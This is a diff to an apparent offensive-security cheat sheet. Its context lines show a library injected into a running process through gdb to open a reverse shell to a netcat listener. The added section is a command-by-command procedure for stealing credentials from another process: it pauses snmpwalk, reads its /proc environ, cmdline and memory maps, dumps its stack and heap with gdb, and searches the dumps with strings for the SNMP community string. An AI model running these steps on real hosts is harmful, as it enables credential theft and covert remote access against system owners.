@@ -140,3 +140,42 @@ void *callback(void *a)
 `echo 'print __libc_dlopen_mode("/tmp/libcallback.so", 2)' | gdb -p 2739`
 
 You should see a connection to your netcat session listening on port 4444.  You should not lose your shell even if the parent process exits.
+
+## >> Dumping creds from the stack and heap of a running process
+
+This example will attack snmpwalk to get the community string.<br>
+**Temporarily suspend the snmpwalk process**<br />
+`SNMPPID=$(ps -ef | grep snmpwalk | grep -v grep | tr -s " " | cut -d " " -f 2); kill -STOP $SNMPPID`
+
+**Get the PID of the snmpwalk process**<br />
+`ps -ef | grep snmpwalk`
+You will notice that the community string has been scrubbed from the argument list.
+
+**Use the PID to view ** `proc` ** filesystem data**<br />
+`cat /proc/<PID>/environ` (This is just standard procedure, you may find some good stuff here)<br />
+`cat /proc/<PID>/cmdline` (This is just standard procedure, you may find some good stuff here)<br />
+Get the `[stack]` and `[heap]` memory ranges.<br />
+`cat /proc/<PID>/maps`<br />
+(e.g. note the memory ranges)<br />
+```
+7fffa3f44000-7fffa3f59000 rwxp 7ffffffe9000 00:00 0       [stack]
+557389846000-557389867000 rw-p 00000000 00:00 0           [heap]
+```
+**Use the PID with gdb to save stack and heap memory to files**<br />
+```
+gdb
+attach <PID>
+dump memory /tmp/snmpwalk.stack.bin 0x7fffa3f44000 0x7fffa3f59000
+dump memory /tmp/snmpwalk.heap.bin 0x557389846000 0x557389867000
+detach
+quit
+```
+**Resume the snmpwalk process**<br />
+`SNMPPID=$(ps -ef | grep snmpwalk | grep -v grep | tr -s " " | cut -d " " -f 2); kill -CONT $SNMPPID`
+
+**scan the output files for both ASCII and unicode strings**<br />
+(hint - the community string is stored in the heap)<br />
+`strings /tmp/snmpwalk.stack.bin | more`<br />
+`strings -e l /tmp/snmpwalk.stack.bin | more`<br />
+`strings /tmp/snmpwalk.heap.bin | more`<br />
+`strings -e l /tmp/snmpwalk.heap.bin | more`<br />
